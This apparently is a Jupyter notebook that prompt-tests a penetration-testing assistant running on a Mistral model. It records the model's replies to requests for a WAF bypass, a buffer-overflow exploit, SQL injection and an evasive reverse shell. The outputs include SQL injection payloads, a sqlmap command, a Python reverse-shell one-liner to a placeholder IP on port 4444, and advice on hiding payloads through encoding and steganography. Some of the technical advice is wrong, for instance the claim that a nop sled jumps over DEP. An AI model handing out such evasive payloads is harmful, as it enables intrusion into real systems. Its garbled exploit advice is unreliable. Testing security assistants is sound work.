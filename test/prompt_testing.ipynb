{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "initial_id",
   "metadata": {
    "collapsed": true,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:21:37.369809Z",
     "start_time": "2024-10-04T07:21:26.208808Z"
    }
   },
   "outputs": [],
   "source": [
    "from src.agent.llm import Ollama\n",
    "from src.agent.tools import TOOLS"
   ]
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "data": {
      "text/plain": "'gobuster, hashcat, Hydra, Nmap, searchsploit, sqlmap'"
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "available_tools = ', '.join([tool.name for tool in TOOLS])\n",
    "available_tools"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:50:00.852714Z",
     "start_time": "2024-10-04T07:50:00.848216Z"
    }
   },
   "id": "29b60a8d7653819a",
   "execution_count": 42
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "system_prompt = \"\"\"As a proficient assistant in Penetration Testing, your task is to help an authorized user during a penetration testing assessment of a target system. \n",
    "The user will usually ask you how to do some task or he will tell you the results of some activity; you should always briefly expose your understanding of the required task, one or two sentences should be enough. \n",
    "When it is clear that you have a good understanding of the task you should propose possible solutions; a solutions should be paired with tools to perform it, however note that the user is most comfortable with the following tools: {tools}\n",
    "\n",
    "Guidelines:\n",
    "1. **Ask Questions** to understand the user's context or requirements.\n",
    "2. **Do not assume any specific context** such as operating system or network setup without asking the user first.\n",
    "3. **Tool Usage** provide example tool usage to solve the task, but let the user provide you the output.\n",
    "4. **Tool Priority** prefer using the tools the user is most comfortable with\"\"\".format(tools=available_tools)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:52:34.290441Z",
     "start_time": "2024-10-04T07:52:34.286440Z"
    }
   },
   "id": "1db0957d2adfb98a",
   "execution_count": 50
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "model = Ollama(\n",
    "    model='mistral',\n",
    "    client_url='https://945f-35-204-90-181.ngrok-free.app/'\n",
    ")"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:52:35.129611Z",
     "start_time": "2024-10-04T07:52:34.815610Z"
    }
   },
   "id": "7c8e794601eb75c",
   "execution_count": 51
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [
    "def chat(user_input: str):\n",
    "    messages = [\n",
    "        {'role': 'system', 'content': system_prompt},\n",
    "        {'role': 'user', 'content': user_input}\n",
    "    ]\n",
    "    for chunk in  model.query(messages):\n",
    "        print(chunk, end='')\n",
    "    print()"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:52:35.191612Z",
     "start_time": "2024-10-04T07:52:35.186612Z"
    }
   },
   "id": "40957f1c8b577212",
   "execution_count": 52
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To help you decide on the most effective bypass technique for the identified Web Application Firewall (WAF), let's try to gather information about its rules and signatures. One possible approach is using tools like ZAP (Zed Attack Proxy) or Burp Suite, which can help analyze and modify HTTP requests and responses to determine potential WAF triggers.\n",
      "\n",
      "By analyzing the traffic before and after the WAF, you can identify patterns that might indicate specific rules or signatures. This information will help you choose the most suitable technique for bypassing the WAF: encoding the payload, using a different encoding, or modifying request headers. Keep in mind that tools like searchsploit may also be helpful in finding exploits related to the application's vulnerabilities, which could potentially bypass the WAF.\n"
     ]
    }
   ],
   "source": [
    "bypass_firewall = \"I need to bypass a WAF using a technique that avoids detection. I've identified a few possibilities like encoding the payload, using a different encoding, or modifying the request headers. However, I need to determine which technique has the highest chance of success for this particular WAF. Is there any way to identify its specific rules or signatures to make an informed decision?\"\n",
    "\n",
    "chat(bypass_firewall)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:52:40.948079Z",
     "start_time": "2024-10-04T07:52:35.833610Z"
    }
   },
   "id": "b0ad722fdab849d1",
   "execution_count": 53
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To create a successful buffer overflow exploit for the 'system()' function on a 64-bit Linux system with specific glibc version, we need to understand the stack layout, function call conventions, and the exploit mitigations like Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).\n",
      "\n",
      "First, gather information about the target application's binary by using tools such as `readelf` or `objdump`. This will help us understand the stack layout and function call conventions.\n",
      "\n",
      "To bypass ASLR, we can use Return-Oriented Programming (ROP) techniques to construct an exploit that uses only return addresses from the application's code. You can use tools like `gdb` or `ropper` to assist in ROP gadget discovery and payload construction.\n",
      "\n",
      "To bypass DEP, we need to create an exploit that contains a shellcode or ROP chain ending with a sequence of nops (no operation) to jump over the DEP protection. You can use tools like `metasploit-framework` or `mona.py` from Immunity Debugger for generating shellcodes and finding suitable nop sled lengths.\n",
      "\n",
      "Once you have constructed the exploit, test it using a debugger like `gdb` to verify that code execution is achieved as intended.\n"
     ]
    }
   ],
   "source": [
    "binary_exploit = \"I need to create a custom exploit that targets a buffer overflow vulnerability in the 'system()' function of a Linux application. The application runs on a 64-bit system with a specific version of the glibc library. I need to understand the stack layout, function call conventions, and the exploit mitigations like ASLR and DEP implemented in this environment. Can you guide me on how to bypass these mitigations and achieve code execution?\"\n",
    "\n",
    "chat(binary_exploit)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:52:54.596649Z",
     "start_time": "2024-10-04T07:52:46.161221Z"
    }
   },
   "id": "fd9beed00c4cf93e",
   "execution_count": 54
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " To exploit the identified SQL injection vulnerability and extract database schema and sensitive information, you can use various advanced SQL injection techniques such as Union-Based SQL Injection (UBSQLI) or Time-Based Blind SQL Injection (TBBSQLI).\n",
      "\n",
      "For Union-Based SQL Injection, you can craft payloads like this:\n",
      "```sql\n",
      "' UNION SELECT 1,2,3,4,5,6,7,8,9,10, database(), group_concat(table_name), column_name FROM information_schema.tables WHERE table_schema = 'your_database_name' --\n",
      "```\n",
      "\n",
      "For Time-Based Blind SQL Injection, you can use a payload like this:\n",
      "```sql\n",
      "' AND sleep(5) --\n",
      "```\n",
      "To bypass input validation and error handling, you can try encoding your payloads using various techniques such as hexadecimal encoding or URL encoding. Additionally, you can use tools like sqlmap to automate the SQL injection process and handle different types of validation and error handling mechanisms.\n",
      "\n",
      "For example, to use sqlmap for exploiting SQL injection vulnerabilities, you can run:\n",
      "\n",
      "```bash\n",
      "sqlmap -u 'http://target_url/login' --data='username=admin&password=password' --technique=BLOB --dbs\n",
      "```\n"
     ]
    }
   ],
   "source": [
    "sql_injection_exploit =  \"I need to exploit a SQL injection vulnerability on the login form of this web application. I've identified the vulnerability using a blind SQL injection technique, but I need to craft a query to extract the database schema and sensitive information from the database. Can you provide me with some advanced SQL injection payloads to achieve this goal, and how can I bypass any potential security measures like input validation and error handling?\"\n",
    "\n",
    "chat(sql_injection_exploit)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:53:09.804957Z",
     "start_time": "2024-10-04T07:53:01.143041Z"
    }
   },
   "id": "5949277c3d384e58",
   "execution_count": 55
  },
  {
   "cell_type": "code",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Understood. To create a reverse shell payload that can evade detection and bypass security measures like WAFs, you can use Python with the `pyte` library. Here's an example of how to craft a simple reverse shell payload:\n",
      "\n",
      "```bash\n",
      "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"your-ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call;p[\"/bin/sh\"]'\n",
      "```\n",
      "\n",
      "Replace `\"your-ip\"` with your machine's IP address where the payload should connect. This payload will execute a shell on the target server and connect back to port 4444 on your machine.\n",
      "\n",
      "For obfuscation or encoding techniques, you can use base64 encoding or rot13 (a simple Caesar cipher). However, keep in mind that these methods may not always be effective against sophisticated WAFs.\n",
      "\n",
      "Another approach is to embed the payload within a JPEG image using steganography tools like Steghide or Invisible Secrets Agent (ISA). This can help bypass some basic security measures as the payload won't appear as a standalone script.\n",
      "\n",
      "Remember, these techniques should only be used for legitimate penetration testing purposes and within the scope of authorization. Always ensure that you have permission to perform such actions before proceeding.\n"
     ]
    }
   ],
   "source": [
    "reverse_shell = \"I've found a potential RCE vulnerability in a web application. How can I craft a reverse shell payload using Python that will execute on the server and connect back to my machine on port 4444? I need to bypass any security measures in place like WAFs and ensure the payload remains undetected. I'd also like to know what other techniques are available for delivering the payload, such as encoding or obfuscation.\"\n",
    "\n",
    "chat(reverse_shell)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-10-04T07:53:19.962138Z",
     "start_time": "2024-10-04T07:53:09.806458Z"
    }
   },
   "id": "18a19248ff9c1f8c",
   "execution_count": 56
  },
  {
   "cell_type": "code",
   "outputs": [],
   "source": [],
   "metadata": {
    "collapsed": false
   },
   "id": "3822a65ecba4328e"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
